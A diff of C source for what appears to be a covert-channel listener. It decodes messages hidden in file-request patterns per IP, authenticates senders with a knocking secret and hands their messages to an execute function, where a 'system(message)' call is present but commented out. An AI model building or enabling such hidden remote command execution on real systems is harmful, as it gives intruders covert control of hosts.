@@ -35,7 +35,8 @@ contact: g3ol4d0[at]gmail[dot]com
 #define BUF_LENGTH MAX_EVENTS*(E_SIZE+PATH_MAX)
 
 typedef struct decodeSingle { // struct to store a buffer for each IP that connects
-	char buffer[1024] ;
+	char buffer[1024] ; // a buffer for the whole data
+	char charBuffer[1024] ; // a buffer for each char
 	int bufLen ;
 	int auth ; // auth flag
 	char *ip ;
@@ -50,7 +51,7 @@ static char baseCharSet[] = "0123456789abcdefghijklmnopqrstuvwxyz" ; // 36 from 
 // globals
 char * baseDict[BASE_MAX] ; // array to map each file to a value
 int n = 0 ; // which base it will be
-decodeSingle decodeBuffer[1024] ; // buffer for decoding the messages. The message should end in 0x0a
+decodeSingle decodeBuffer[1024] ; // buffer for decoding the messages. The message should end with an 0xa, and the character with a index request
 int iBuffer = 0 ; // lazyness
 
 
@@ -59,7 +60,8 @@ static int cmp(const void *p1, const void *p2){
 }
 
 void execute_message( char * message ) {
-	printf("tem calma carai\n");
+	printf("%s\n",message );
+	// system(message);
 }
 
 void parse_log( char * lastLine ) {
@@ -112,7 +114,7 @@ void parse_log( char * lastLine ) {
 	last2Buffer = &decodeBuffer[nth].buffer[decodeBuffer[nth].bufLen-2] ; 	
 
 	// check is the end of the message
-	if ( strtol( last2Buffer , &temp , n ) == 10 ) { // 10 == 0x0a
+	if ( strtol( last2Buffer , &temp , n ) == 10 ) { // 10 == 0x0a == my EOF
 		if ( decodeBuffer[nth].auth == 1 ) {
 			execute_message( decodeBuffer[nth].buffer ) ;
 		} else if ( strcmp( decodeBuffer[nth].buffer , knockingSecret ) == 0 ) {
